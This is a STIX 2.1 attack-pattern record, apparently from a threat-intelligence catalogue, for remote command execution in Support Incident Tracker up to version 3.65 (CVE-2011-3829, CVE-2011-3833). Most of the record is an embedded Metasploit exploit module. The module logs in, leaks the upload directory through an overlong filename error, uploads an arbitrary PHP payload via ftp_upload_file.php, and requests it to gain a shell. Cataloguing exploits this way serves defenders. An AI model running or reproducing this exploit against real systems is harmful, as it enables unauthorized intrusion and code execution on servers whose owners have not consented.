{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9df67827-e942-4fa0-9ec3-f8f82e510dc3",
    "created": "2024-08-14T17:07:37.683856Z",
    "modified": "2024-08-14T17:07:37.683861Z",
    "name": "Support Incident Tracker Remote Command Execution",
    "description": " This module combines two separate issues within Support Incident Tracker (<= 3.65) application to upload arbitrary data and thus execute a shell. The two issues exist in ftp_upload_file.php. The first vulnerability exposes the upload dir used to store attachments. The second vulnerability allows arbitrary file upload since there is no validation function to prevent from uploading any file type. Authentication is required to exploit both vulnerabilities. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sit_file_upload.rb",
            "external_id": "sit_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3829"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3833"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20111202001019/http://secunia.com:80/secunia_research/2011-75"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20120105104613/http://secunia.com/secunia_research/2011-79/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Support Incident Tracker Remote Command Execution',\n      'Description'    => %q{\n          This module combines two separate issues within Support Incident Tracker (<= 3.65)\n        application to upload arbitrary data and thus execute a shell. The two issues exist\n        in ftp_upload_file.php.\n        The first vulnerability exposes the upload dir used to store attachments.\n        The second vulnerability allows arbitrary file upload since there is no\n        validation function to prevent from uploading any file type.\n        Authentication is required to exploit both vulnerabilities.\n      },\n      'Author'         =>\n        [\n          'Secunia Research', # Original discovery\n          'juan vazquez'      # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2011-3829'],\n          ['CVE', '2011-3833'],\n          ['OSVDB', '76999'],\n          ['OSVDB', '77003'],\n          ['URL', 'http://web.archive.org/web/20111202001019/http://secunia.com:80/secunia_research/2011-75'],\n          ['URL', 'http://web.archive.org/web/20120105104613/http://secunia.com/secunia_research/2011-79/'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            }\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2011-11-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"SiT! directory path\", \"/sit\"]),\n        OptString.new('USERNAME', [ true, 'The username to authenticate as','' ]),\n        OptString.new('PASSWORD', [ true, 'The password for the specified username','' ]),\n      ])\n  end\n\n  def check\n\n    uri = normalize_uri(datastore['URI'], \"index.php\")\n\n    res = send_request_raw({\n      'uri'     => uri\n    })\n\n    if (res and res.body =~ /SiT! Support Incident Tracker v(\\d)\\.(\\d\\d)/)\n      ver = [ $1.to_i, $2.to_i ]\n      vprint_status(\"SiT! #{ver[0]}.#{ver[1]}\")\n\n      if (ver[0] == 3 and ver[1] == 65)\n        return Exploit::CheckCode::Appears\n      elsif (ver[0] == 3 and ver[1] < 65)\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def retrieve_session(user, pass)\n\n    uri = normalize_uri(datastore['URI'], \"login.php\")\n\n    res = send_request_cgi({\n      'uri'     => uri,\n      'method'  => 'POST',\n      'data'    => \"username=#{user}&password=#{pass}\",\n    }, 25)\n\n    if (res and res.code == 302 and res.headers['Location'] =~ /main.php/)\n      print_good(\"Successfully logged in as #{user}:#{pass}\")\n\n      if (res.get_cookies =~ /SiTsessionID/) and res.get_cookies.split(\"SiTsessionID\")[-1] =~ /=(.*);/\n        session = $1\n        print_good(\"Successfully retrieved cookie: #{session}\")\n        return session\n      else\n        fail_with(Failure::Unknown, \"Error retrieving cookie!\")\n      end\n    else\n      fail_with(Failure::Unknown, \"Error logging in.\")\n    end\n  end\n\n  def upload_page(session, newpage, contents)\n\n    uri = normalize_uri(datastore['URI'], \"ftp_upload_file.php\")\n\n    boundary = rand_text_alphanumeric(6)\n\n    data = \"--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"file\\\"; \"\n    data << \"filename=\\\"#{newpage}\\\"\\r\\n\"\n    data << \"Content-Type: application/x-httpd-php\\r\\n\\r\\n\"\n    data << contents\n    data << \"\\r\\n--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"shortdescription\\\"\\r\\n\\r\\n\"\n    data << rand_text_alphanumeric(rand(10 + 10))\n    data << \"\\r\\n--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"longdescription\\\"\\r\\n\\r\\n\"\n    data << rand_text_alphanumeric(rand(20) + 20)\n    data << \"\\r\\n--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"fileversion\\\"\\r\\n\\r\\n\"\n    data << \"1\"\n    data << \"\\r\\n--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"action\\\"\\r\\n\\r\\n\"\n    data << \"publish\"\n    data << \"\\r\\n--#{boundary}--\"\n\n    res = send_request_raw({\n      'uri'\t  => uri,\n      'method'  => 'POST',\n      'data'    => data,\n      'headers' =>\n      {\n        'Content-Type'\t => 'multipart/form-data; boundary=' + boundary,\n        'Content-Length' => data.length,\n        'Cookie'\t => \"SiTsessionID=#{session}\",\n      }\n    }, 25)\n\n    if (res and res.code == 200)\n      print_good(\"Successfully Uploaded #{newpage}\")\n      return res\n    else\n      fail_with(Failure::Unknown, \"Error uploading #{newpage}\")\n    end\n  end\n\n  def retrieve_upload_dir(session)\n    data =  rand_text_alphanumeric(rand(20)+20)\n    filename = rand_text_alphanumeric(rand(256) + 300)\n    res = upload_page(session, filename, data)\n\n    if res.body =~ /attachments-(.*)\\/#{filename}\\): failed to open stream/\n      upload_dir = \"attachments-#{$1}\"\n      print_good(\"Successfully retrieved upload dir: #{upload_dir}\")\n      return upload_dir\n    else\n      fail_with(Failure::Unknown, \"Error retrieving the upload dir\")\n    end\n\n  end\n\n  def cmd_shell(cmdpath)\n    print_status(\"Calling payload: #{cmdpath}\")\n\n    uri = normalize_uri(datastore['URI'], cmdpath)\n\n    send_request_raw({\n      'uri'\t=> uri\n    }, 25)\n    return\n  end\n\n  def exploit\n    cmd_php = '<?php ' + payload.encoded + '?>'\n    cmdscript   = rand_text_alphanumeric(rand(10)+10) + '.php'\n    user        = datastore['USERNAME']\n    pass        = datastore['PASSWORD']\n\n    session = retrieve_session(user, pass)\n    upload_dir = retrieve_upload_dir(session) # CVE-2011-3829\n    upload_page(session, cmdscript, cmd_php) # CVE-2011-3833\n    cmdpath = \"#{upload_dir}/#{cmdscript}\"\n    cmd_shell(cmdpath)\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-10",
    "x_mitre_platforms": [
        "php'"
    ]
}